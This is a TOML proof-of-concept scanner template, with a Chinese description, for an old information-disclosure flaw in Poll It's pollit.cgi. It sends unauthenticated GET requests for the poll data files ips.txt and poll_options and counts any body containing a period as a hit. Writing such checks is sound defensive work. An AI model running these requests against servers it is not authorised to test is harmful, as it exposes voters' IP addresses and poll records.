[info]
author = "AVE"
description = "Poll It 2.01 及更早版本的 pollit.cgi 将投票数据文件（如 ips.txt、poll_options）存放在 Web 文档根目录下的 pollit_files 目录中，未做访问控制。远程攻击者无需认证即可通过直接访问这些文件获取投票记录、用户 IP 地址等敏感信息。"
id = "POC-AVE-2000-1073"
name = "Poll It pollit.cgi 信息泄露 PoC"
severity = "medium"
tags = ["ave-2000-1073"]
vuln_id = [
    "CVE-2000-1070",
    "AVE-2000-1073",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/pollit_files/ips.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["."]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/pollit_files/poll_options"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["."]
